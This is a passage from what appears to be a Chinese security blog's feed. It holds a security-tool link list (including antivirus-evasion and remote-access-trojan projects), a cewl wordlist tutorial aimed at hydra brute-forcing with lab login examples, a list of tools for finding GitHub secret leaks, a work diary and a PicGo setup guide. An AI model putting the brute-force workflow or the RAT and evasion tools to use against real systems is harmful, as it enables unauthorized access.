rel="noopener">https://github.com/P1kachu/v0lt</a></p><h1 id="0x17-各类编程资源"><a href="#0x17-各类编程资源" class="headerlink" title="0x17 各类编程资源"></a>0x17 各类编程资源</h1><p>大礼包（什么都有）:</p><p><a href="https://github.com/bayandin/awesome-awesomeness" target="_blank" rel="noopener">https://github.com/bayandin/awesome-awesomeness</a></p><p>bash-handbook:</p><p><a href="https://github.com/denysdovhan/bash-handbook" target="_blank" rel="noopener">https://github.com/denysdovhan/bash-handbook</a></p><p>python资源大全:</p><p><a href="https://github.com/jobbole/awesome-python-cn" target="_blank" rel="noopener">https://github.com/jobbole/awesome-python-cn</a></p><p>git学习资料:</p><p><a href="https://github.com/xirong/my-git" target="_blank" rel="noopener">https://github.com/xirong/my-git</a></p><p>安卓开源代码解析</p><p><a href="https://github.com/android-cn/android-open-project" target="_blank" rel="noopener">https://github.com/android-cn/android-open-project</a></p><p>python框架，库，资源大合集:</p><p><a href="https://github.com/vinta/awesome-python" target="_blank" rel="noopener">https://github.com/vinta/awesome-python</a></p><p>JS 正则表达式库（用于简化构造复杂的JS正则表达式）:</p><p><a href="https://github.com/VerbalExpressions/JSVerbalExpressions" target="_blank" rel="noopener">https://github.com/VerbalExpressions/JSVerbalExpressions</a></p><h1 id="0x18-Python"><a href="#0x18-Python" class="headerlink" title="0x18 Python"></a>0x18 Python</h1><p>python 正则表达式库（用于简化构造复杂的python正则表达式）:</p><p><a href="https://github.com/VerbalExpressions/" target="_blank" rel="noopener">https://github.com/VerbalExpressions/</a></p><p>python任务管理以及命令执行库:</p><p><a href="https://github.com/pyinvoke/invoke" target="_blank" rel="noopener">https://github.com/pyinvoke/invoke</a></p><p>python exe打包库:</p><p><a href="https://github.com/pyinstaller/pyinstaller" target="_blank" rel="noopener">https://github.com/pyinstaller/pyinstaller</a></p><p>Veil-Evasion免杀项目：</p><p><a href="https://github.com/Veil-Framework/Veil-Evasion" target="_blank" rel="noopener">https://github.com/Veil-Framework/Veil-Evasion</a></p><p>py3 爬虫框架:</p><p><a href="https://github.com/orf/cyborg" target="_blank" rel="noopener">https://github.com/orf/cyborg</a></p><p>一个提供底层接口数据包编程和网络协议支持的python库:</p><p><a href="https://github.com/CoreSecurity/impacket" target="_blank" rel="noopener">https://github.com/CoreSecurity/impacket</a></p><p>python requests 库:</p><p><a href="https://github.com/kennethreitz/requests" target="_blank" rel="noopener">https://github.com/kennethreitz/requests</a></p><p>python 实用工具合集:</p><p><a href="https://github.com/mahmoud/boltons" target="_blank" rel="noopener">https://github.com/mahmoud/boltons</a></p><p>python爬虫系统:</p><p><a href="https://github.com/binux/pyspider" target="_blank" rel="noopener">https://github.com/binux/pyspider</a></p><h1 id="0x19-科学上网"><a href="#0x19-科学上网" class="headerlink" title="0x19 科学上网"></a>0x19 科学上网</h1><p>科学上网工具</p><p><a href="https://github.com/XX-net/XX-Net" target="_blank" rel="noopener">https://github.com/XX-net/XX-Net</a></p><h1 id="0x20-福利"><a href="#0x20-福利" class="headerlink" title="0x20 福利"></a>0x20 福利</h1><p>微信自动抢红包动态库</p><p><a href="https://github.com/east520/AutoGetRedEnv" target="_blank" rel="noopener">https://github.com/east520/AutoGetRedEnv</a></p><p>微信抢红包插件（安卓版）</p><p><a href="https://github.com/geeeeeeeeek/WeChatLuckyMoney" target="_blank" rel="noopener">https://github.com/geeeeeeeeek/WeChatLuckyMoney</a></p><p>hardsed神器:</p><p><a href="https://github.com/yangyangwithgnu/hardseed" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/hardseed</a></p><h1 id="0x21-甲方安全工程师生存指南"><a href="#0x21-甲方安全工程师生存指南" class="headerlink" title="0x21 甲方安全工程师生存指南"></a>0x21 甲方安全工程师生存指南</h1><p>web索引及日志搜索工具：</p><p><a href="https://github.com/thomaspatzke/WASE" target="_blank" rel="noopener">https://github.com/thomaspatzke/WASE</a></p><p>开源日志采集器：</p><p><a href="https://github.com/wgliang/logcool" target="_blank" rel="noopener">https://github.com/wgliang/logcool</a></p><p>扫描CS结构的web debuger</p><p><a href="https://github.com/Kozea/wdb" target="_blank" rel="noopener">https://github.com/Kozea/wdb</a></p><p>恢复sqlite数据库删除注册信息：</p><p><a href="https://github.com/aramosf/recoversqlite/" target="_blank" rel="noopener">https://github.com/aramosf/recoversqlite/</a></p><p>gps欺骗检测工具:</p><p><a href="https://github.com/zxsecurity/gpsnitch" target="_blank" rel="noopener">https://github.com/zxsecurity/gpsnitch</a></p><p>应急处置响应框架:</p><p><a href="https://github.com/biggiesmallsAG/nightHawkResponse" target="_blank" rel="noopener">https://github.com/biggiesmallsAG/nightHawkResponse</a></p><p>web安全开发指南:</p><p><a href="https://github.com/FallibleInc/security-guide-for-developers" target="_blank" rel="noopener">https://github.com/FallibleInc/security-guide-for-developers</a></p><p>各个知名厂商漏洞测试报告模板：</p><p><a href="https://github.com/juliocesarfort/public-pentesting-reports" target="_blank" rel="noopener">https://github.com/juliocesarfort/public-pentesting-reports </a>linux下恶意代码检测包：</p><p><a href="https://github.com/rfxn/linux-malware-detect" target="_blank" rel="noopener">https://github.com/rfxn/linux-malware-detect</a></p><p>操作系统运行指标可视化框架：</p><p><a href="https://github.com/facebook/osquery" target="_blank" rel="noopener">https://github.com/facebook/osquery</a></p><p>恶意代码分析系统：</p><p><a href="https://github.com/cuckoosandbox/cuckoo" target="_blank" rel="noopener">https://github.com/cuckoosandbox/cuckoo</a></p><p>定期搜索及存储web应用：</p><p><a href="https://github.com/Netflix/Scumblr" target="_blank" rel="noopener">https://github.com/Netflix/Scumblr</a></p><p>事件响应框架：</p><p><a href="https://github.com/google/grr" target="_blank" rel="noopener">https://github.com/google/grr</a></p><p>综合主机监控检测平台：</p><p><a href="https://github.com/ossec/ossec-hids" target="_blank" rel="noopener">https://github.com/ossec/ossec-hids</a></p><p>分布式实时数字取证系统：</p><p><a href="https://github.com/mozilla/mig" target="_blank" rel="noopener">https://github.com/mozilla/mig</a></p><p>Microsoft &amp; Unix 文件系统及硬盘取证工具：</p><p><a href="https://github.com/sleuthkit/sleuthkit" target="_blank" rel="noopener">https://github.com/sleuthkit/sleuthkit</a></p><h1 id="0x22-蜜罐"><a href="#0x22-蜜罐" class="headerlink" title="0x22 蜜罐"></a>0x22 蜜罐</h1><p>SSH蜜罐：</p><p><a href="https://github.com/desaster/kippo" target="_blank" rel="noopener">https://github.com/desaster/kippo</a></p><p>蜜罐集合资源：</p><p><a href="https://github.com/paralax/awesome-honeypots" target="_blank" rel="noopener">https://github.com/paralax/awesome-honeypots</a></p><p>kippo进阶版蜜罐：</p><p><a href="https://github.com/micheloosterhof/cowrie" target="_blank" rel="noopener">https://github.com/micheloosterhof/cowrie</a></p><p>SMTP 蜜罐：</p><p><a href="https://github.com/awhitehatter/mailoney" target="_blank" rel="noopener">https://github.com/awhitehatter/mailoney</a></p><p>web应用程序蜜罐：</p><p><a href="https://github.com/mushorg/glastopf" target="_blank" rel="noopener">https://github.com/mushorg/glastopf</a></p><p>数据库蜜罐：</p><p><a href="https://github.com/jordan-wright/elastichoney" target="_blank" rel="noopener">https://github.com/jordan-wright/elastichoney</a></p><p>web蜜罐：</p><p><a href="https://github.com/atiger77/Dionaea" target="_blank" rel="noopener">https://github.com/atiger77/Dionaea</a></p><h1 id="0x23-远控"><a href="#0x23-远控" class="headerlink" title="0x23 远控"></a>0x23 远控</h1><p>用gmail充当C&amp;C服务器的后门</p><p><a href="https://github.com/byt3bl33d3r/gcat" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/gcat</a></p><p>开源的远控：</p><p><a href="https://github.com/UbbeLoL/uRAT" target="_blank" rel="noopener">https://github.com/UbbeLoL/uRAT</a></p><p>c#远控：</p><p><a href="https://github.com/hussein-aitlahcen/BlackHole" target="_blank" rel="noopener">https://github.com/hussein-aitlahcen/BlackHole</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码生成工具cewl的使用</title>
      <link href="/2019/08/22/%E5%AF%86%E7%A0%81%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7-cewl%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/2019/08/22/%E5%AF%86%E7%A0%81%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7-cewl%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>今天给大家介绍的是<code>Linux</code>字典生成工具<code>cewl</code>，并学习更多的高级参数用法。首先先简单的介绍一个<code>cewl</code>工具，该工具最大的功能就能能够爬取网站上的信息并自动生成字典，然后就可以使用该字典配合<code>hydra</code>去进行暴力破解，该工具常用于<code>CTF</code>中攻靶拿<code>Flag</code>使用。<code>OK</code>下面开始进入正题。</p><a id="more"></a><h1 id="0x01-环境需求"><a href="#0x01-环境需求" class="headerlink" title="0x01 环境需求"></a>0x01 环境需求</h1><blockquote><p>cewl需要安装在Linux中使用，我使用的环境事kali Linux</p></blockquote><p>如果使用的是其他<code>Linux</code>版本的系统话，需要使用命令去安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sodo apt-get install cewl</span><br></pre></td></tr></table></figure><p>命令行运行截图</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822170114.png" class="lozad"></p><h1 id="0x02-参数说明"><a href="#0x02-参数说明" class="headerlink" title="0x02 参数说明"></a>0x02 参数说明</h1><h2 id="2-1-可选参数"><a href="#2-1-可选参数" class="headerlink" title="2.1 可选参数"></a>2.1 可选参数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">-h, –help：显示帮助。</span><br><span class="line">-k, –keep：保存下载文件。</span><br><span class="line">-d &lt;x&gt;, –depth &lt;x&gt;：爬行深度，默认2。</span><br><span class="line">-m, –min_world_length：最小长度，默认最小长度为3。</span><br><span class="line">-o, –offsite：允许爬虫访问其他站点。</span><br><span class="line">-w, –write：将输出结果写入到文件。</span><br><span class="line">-u, –ua &lt;agent&gt;：设置user agent。</span><br><span class="line">-n, –no-words：不输出字典。</span><br><span class="line">–with-numbers：允许单词中存在数字，跟字母一样。</span><br><span class="line">-a, –meta：包括元数据。</span><br><span class="line">–meta_file file：输出元数据文件。</span><br><span class="line">-e, –email：包括email地址。</span><br><span class="line">–email_file &lt;file&gt;：输入邮件地址文件。</span><br><span class="line">–meta-temp-dir &lt;dir&gt;：exiftool解析文件时使用的临时目录，默认是/temp。</span><br><span class="line">-c, –count：显示发现的每个单词的数量。</span><br><span class="line">-v, –verbose：verbose。</span><br><span class="line">–debug:提取调试信息。</span><br></pre></td></tr></table></figure><h2 id="2-2-认证"><a href="#2-2-认证" class="headerlink" title="2.2 认证"></a>2.2 认证</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">–auth_type：Digest或者basic认证。</span><br><span class="line">–auth_user：用户名认证。</span><br><span class="line">–auth_pass：密码认证。</span><br></pre></td></tr></table></figure><h2 id="2-3-代理"><a href="#2-3-代理" class="headerlink" title="2.3 代理"></a>2.3 代理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">–proxy_host：代理主机。</span><br><span class="line">–proxy_port：代理端口，默认8080。</span><br><span class="line">–proxy_username：用户名代理。</span><br><span class="line">–proxy_password：密码代理。</span><br></pre></td></tr></table></figure><h1 id="0x03-实例使用"><a href="#0x03-实例使用" class="headerlink" title="0x03 实例使用"></a>0x03 实例使用</h1><p><strong>语法：</strong><code>cewl &lt;url&gt; [options]</code></p><h2 id="3-1-简单用法"><a href="#3-1-简单用法" class="headerlink" title="3.1 简单用法"></a>3.1 简单用法</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl https://xxxx.com</span><br></pre></td></tr></table></figure><p><strong>用法说明：</strong><code>cewl</code>会爬行该网页，抓取网页中的英文字母，没有设置最小字母长度的情况下默认是3,可以使用<code>-m</code>来指定最小单词长度。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822171448.png" class="lozad"></p><p>##3.2 保存输出结果</p><p>将指定长度的结果报错在<code>txt</code>文件中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cewl https://digi.ninja/ -m 5 -w test.txt  </span><br><span class="line"><span class="comment">##爬行该页面上最小长度为5的单词并将结果保存在test.txt文档中</span></span><br></pre></td></tr></table></figure><p>然后输入<code>ls -lh</code>来查看结果文件</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822171645.png" class="lozad"></p><p>使用<code>cat test.txt</code>命令来查看</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822171700.png" class="lozad"></p><blockquote><p>ps:如果该站点的英文单词特别多的话，需要相当一段时间。</p></blockquote><p>然后输入<code>ls -lh</code>来查看结果文件</p><p>##3.3 从网站获取email地址</p><p>你可以使用<code>-e</code>参数来启用邮件参数，配合<code>-n</code>参数使用，<code>-n</code>参数是在爬行给定网站时隐藏生成的单词列表：</p><p>由于刚刚的测试站点上没有<code>email</code>地址，为了能更好的展示出来，换了一个有<code>email</code>地址的网页。结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl 目标站点 -e -n</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822171934.png" class="lozad"></p><h2 id="3-4-统计网站中单词的重复次数"><a href="#3-4-统计网站中单词的重复次数" class="headerlink" title="3.4 统计网站中单词的重复次数"></a>3.4 <strong>统计网站中单词的重复次数</strong></h2><p>一个英文网站中，不免有很多重复的单词，如果你想统计每个单词的重复次数，可以使用<code>-c</code>命令</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822171959.png" class="lozad"></p><h2 id="3-5-增加爬行深度"><a href="#3-5-增加爬行深度" class="headerlink" title="3.5 增加爬行深度"></a>3.5 <strong>增加爬行深度</strong></h2><p>如果你想增加爬行等级，来遍历网站中更多的单词来生成更大的字典，你可以使用<code>-d</code>参数，并指定一个爬行深度</p><p>等级来进行更加深入的爬行，默认等级是2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn -d 3</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822172036.png" class="lozad"></p><h2 id="3-6-提取调试信息"><a href="#3-6-提取调试信息" class="headerlink" title="3.6 提取调试信息"></a>3.6 提取调试信息</h2><p>你可以使用<code>--debug</code>参数来启用调试模式，显示爬行网站时的错误和原始详细信息：</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822172120.png" class="lozad"></p><h2 id="3-7-Verbose模式"><a href="#3-7-Verbose模式" class="headerlink" title="3.7 Verbose模式"></a>3.7 <strong>Verbose模式</strong></h2><p>为了扩大网站的爬行结果来获取网站更加完整详细的信息，你可以加-v参数，也就是<code>verbose</code>模式。它不会生成字典，而是会<code>dump</code>网站上的信息。</p><h2 id="3-8-生成数字字典"><a href="#3-8-生成数字字典" class="headerlink" title="3.8 生成数字字典"></a>3.8 生成数字字典</h2><p>如果你想生成字母数字字典，你可以使用—with-numbers参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://testphp.vulnweb.com/ --with-numbers</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822172223.png" class="lozad"></p><h2 id="3-9-cewl摘要-基础认证"><a href="#3-9-cewl摘要-基础认证" class="headerlink" title="3.9 cewl摘要/基础认证"></a>3.9 <strong>cewl摘要/基础认证</strong></h2><p>如果存在一个认证页面来登录网站，那么上面的配置就行不通了，为了生成字典，我们需要使用下面的参数来绕过认证页面：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">–auth_type: Digest/basic</span><br><span class="line"> –auth_user:用户名</span><br><span class="line"> –auth_pass: 密码</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://192.168.1.105/dvwa/login.php --auth_type Digest --auth_user  --用户名 auth_pass 密码 -v</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://192.168.1.105/dvwa/login.php --auth_type basic --auth_user admin --auth_pass password -v</span><br></pre></td></tr></table></figure><h2 id="3-9-代理URL"><a href="#3-9-代理URL" class="headerlink" title="3.9 代理URL"></a>3.9 <strong>代理URL</strong></h2><p>如果网站使用了代理服务器，那么cewl的默认命令就无法生成字典了，比如下面这条命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl -w dict.txt http://192.168.1.103/wordpress/</span><br></pre></td></tr></table></figure><p>不过你可以使用—proxy参数来开启代理URL，这样就可以生成字典了，比如下列命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl --proxy_host 192.168.1.103 --proxy_port 3128 -w dict.txt http://192.168.1.103/wordpress/</span><br></pre></td></tr></table></figure><p>如下图所示，执行第二条命令之后，成功的输出了单词列表：</p><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p><a href="https://www.4hou.com/tools/14693.html" target="_blank" rel="noopener">https://www.4hou.com/tools/14693.html</a></p><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>工作之杂谈</title>
      <link href="/2019/08/22/%E5%B7%A5%E4%BD%9C%E4%B9%8B%E6%9D%82%E8%B0%88/"/>
      <url>/2019/08/22/%E5%B7%A5%E4%BD%9C%E4%B9%8B%E6%9D%82%E8%B0%88/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>简单谈谈在第一家公司工作近半年的感受。emmm，我的语文打小就不好，所以不会写软文，只会写大白话。做做记录而已啦~</p><a id="more"></a><h1 id="0x01-正文"><a href="#0x01-正文" class="headerlink" title="0x01 正文"></a>0x01 正文</h1><p>转眼间，我在第一家公司工作有近半年的时间了，在这半年的时间里，怎么说尼，我收获到了知识、工作技能、朋友，虽然我工作的这家公司不是什么500强公司，但是公司的工作氛围还可以，并且自己在做完工作后可以看书提升自己的技能。下面来简单介绍一下这几个月的工作和生活情况。</p><h2 id="1-1-第一个月"><a href="#1-1-第一个月" class="headerlink" title="1.1 第一个月"></a>1.1 第一个月</h2><p>  刚到公司的第一天，我来的还挺早，看到很多陌生的同事，我也不知道咋办，我，情商比较低，so，尴尬的喊哥，喊姐的打招呼。然后把公司的同事QQ都加了一遍（是不是有点小学生的感觉 0.0）。</p><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> 记录生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工作 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4款GitHub泄露敏感信息搜索工具的安装使用与比较</title>
      <link href="/2019/08/22/4%E6%AC%BEGitHub%E6%B3%84%E9%9C%B2%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E7%B4%A2%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E4%B8%8E%E6%AF%94%E8%BE%83/"/>
      <url>/2019/08/22/4%E6%AC%BEGitHub%E6%B3%84%E9%9C%B2%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E7%B4%A2%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E4%B8%8E%E6%AF%94%E8%BE%83/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>GitHub是一个免费开源的网站，是每个程序员最喜欢发布代码，分享技术的地方，这就导致了一个问题，程序员上传的代码中可能包含了项目中的敏感信息，比如数据库的链接地址和账号密码等。今天来给大家介绍4款发现GitHub中泄露的敏感信息的工具，并将它们做个对比。</p><a id="more"></a><h1 id="0x01-gitrob"><a href="#0x01-gitrob" class="headerlink" title="0x01  gitrob"></a>0x01  gitrob</h1><p>Ruby开发，支持通过postgresql数据库<br><a href="https://github.com/michenriksen/gitrob" target="_blank" rel="noopener">https://github.com/michenriksen/gitrob</a></p><h1 id="0x02-weakfilescan"><a href="#0x02-weakfilescan" class="headerlink" title="0x02 weakfilescan"></a>0x02 weakfilescan</h1><p>weakfilescan<br>Python开发，多线程，猪猪侠开发中文注释，个性化定制，需要beautifulsoup4<br>用于渗透人员在对网站进行网站渗透时查找敏感文件（配置文件、临时文件）、敏感目录，会首先爬取目标站点的三层目录资源，生成目录FUZZ和文件FUZZ<br><a href="https://github.com/ring04h/weakfilescan" target="_blank" rel="noopener">https://github.com/ring04h/weakfilescan</a></p><h1 id="0x03-GitPrey"><a href="#0x03-GitPrey" class="headerlink" title="0x03 GitPrey"></a>0x03 GitPrey</h1><p>GitPrey<br>Python开发，国人开发中文支持，用于企业搜索关键词，及时发现潜在的敏感信息，需要登录<br><a href="https://github.com/repoog/GitPrey" target="_blank" rel="noopener">https://github.com/repoog/GitPrey</a></p><h1 id="0x04-GitMiner"><a href="#0x04-GitMiner" class="headerlink" title="0x04 GitMiner"></a>0x04 GitMiner</h1><p>GitMiner<br>Python开发，功能简单<br><a href="https://github.com/UnkL4b/GitMiner" target="_blank" rel="noopener">https://github.com/UnkL4b/GitMiner</a>  </p><h1 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h1><p><a href="https://www.cnblogs.com/sch01ar/p/7625607.html" target="_blank" rel="noopener">https://www.cnblogs.com/sch01ar/p/7625607.html</a></p><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息泄露 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PicGo+GitHub打造自己的图床</title>
      <link href="/2019/08/22/picbed-GitHub%E6%89%93%E9%80%A0%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/"/>
      <url>/2019/08/22/picbed-GitHub%E6%89%93%E9%80%A0%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>很多朋友之前使用七牛云作为自己博客的图床，但是在试用域名到到期后，所有的图片都挂掉了，造成了不必要的麻烦。今天给大家介绍 picbed+GitHub打造一个专属于自己的图床，将所有的图片都托管到GitHub上，写作时，只需要功按几个快捷键就可以完成图片的上传和展示，让你爱上创作。</p><a id="more"></a><h1 id="0x01-前期准备"><a href="#0x01-前期准备" class="headerlink" title="0x01 前期准备"></a>0x01 前期准备</h1><blockquote><p>需要的东西：</p><p>GitHub账号</p><p>picbed图床工具</p></blockquote><h2 id="1-1-GitHub账号申请"><a href="#1-1-GitHub账号申请" class="headerlink" title="1.1 GitHub账号申请"></a>1.1 GitHub账号申请</h2><p>出门右拐百度</p><h2 id="1-2-新建图床仓库"><a href="#1-2-新建图床仓库" class="headerlink" title="1.2 新建图床仓库"></a>1.2 新建图床仓库</h2><p>点击 git 主页右上角的 <code>+</code> 创建 <code>New repository</code>；</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822153421.png" class="lozad"></p><p>填写仓库信息，例如我就创建了一个 <code>cloudimg</code> 的仓库。这里注意，仓库得设置为 <code>Public</code> 因为后面通过客户端访问算是外部访问，因此无法访问 <code>Private</code> ，这样的话图片传上来之后只能存储不能显示。所以要设置为 <code>Public</code>。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822153247.png" class="lozad"></p><h2 id="1-3-创建-token-并复制保存"><a href="#1-3-创建-token-并复制保存" class="headerlink" title="1.3 创建 token 并复制保存"></a>1.3 创建 token 并复制保存</h2><p>此时仓库已经建立，点击右上角头像，然后进入设置；</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822154036.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822154102.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822154201.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822154229.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822154427.png" class="lozad"></p><p>然后拉到下方创建，创建成功后，会出现下方的一串token，记得要复制，只会出现一次，不过实在忘记的话，可以删除了重新创建一个。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822154526.png" class="lozad"></p><h1 id="0x02-PicGo-客户端配置"><a href="#0x02-PicGo-客户端配置" class="headerlink" title="0x02 PicGo 客户端配置"></a>0x02 PicGo 客户端配置</h1><h2 id="2-1-PicGod的下载安装"><a href="#2-1-PicGod的下载安装" class="headerlink" title="2.1 PicGod的下载安装"></a>2.1 PicGod的下载安装</h2><p>PicGo （目前 2.0.4）是一个开源的图床工具，非常优秀。可以到 git 上下载，但下载速度太慢，所以我放了一个百度云的链接，速度快很多。</p><p>git地址：<a href="https://github.com/Molunerfinn/PicGo" target="_blank" rel="noopener">PicGo</a></p><p>Win版下载链接：<a href="https://pan.baidu.com/s/17KycPMoqNCnc1cR_yQO8nQ" target="_blank" rel="noopener">百度云</a> 密码：PicG</p><p>##2.2 PicGod的配置</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822154935.png" class="lozad"></p><p>注意：设置自定义域名不要填，不然会一直提示上传图片失败，具体原因我也不知道为什么，在网上找的教程都配置了，但是我配置了以后上传图片总是失败，也算是一个大坑了，</p><h2 id="2-3-快捷键的设置"><a href="#2-3-快捷键的设置" class="headerlink" title="2.3 快捷键的设置"></a>2.3 快捷键的设置</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822155154.png" class="lozad"></p><p>想用什么快捷键只需要在键盘上安装几个键然后点击确定就行了，我这里的快捷键是Ctrl+Shift+C</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822155219.png" class="lozad"></p><p>开启开机自启和使用时间戳将上传的文件重命名</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822155353.png" class="lozad"></p><h2 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h2><p>配置好上传快捷键以后，还需要安装一个autocopy插件，该插件可以在你上传成功后，自动生成Markdown语法的图片链接到剪切板，只需要复制到Markdown编辑器就可以预览图片，简直方便至极。只需搜索安装就行了。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822160535.png" class="lozad"></p><p>上传成功的相册专区</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822160606.png" class="lozad"></p><p>如果图片的Markdown链接没有自动复制到剪切板，只需要在相册中重新点击一下对应图片下方的复制按钮即可。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822160722.png" class="lozad"></p><h1 id="0x03-吐槽"><a href="#0x03-吐槽" class="headerlink" title="0x03 吐槽"></a>0x03 吐槽</h1><p>通过上面的操作，我们已经可以成功的将图片上传到GitHub了，但是有一点不得不吐槽一下，就是GitHub毕竟是国外的，所以我们上传到GitHub的图片加载的速度会有点慢，所以我就研究了一下微博图床，毕竟微博是国内的，然后就有了下面的事件。</p><p>配置好微博的图床</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822161539.png" class="lozad"></p><p>很开心的上传了图片，然后使用hexo本地加载一切正常，但是很奇怪的是部署到博客中的时候，浙西图片全部都显示404，我当时的心情是这样的。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822161221.png" 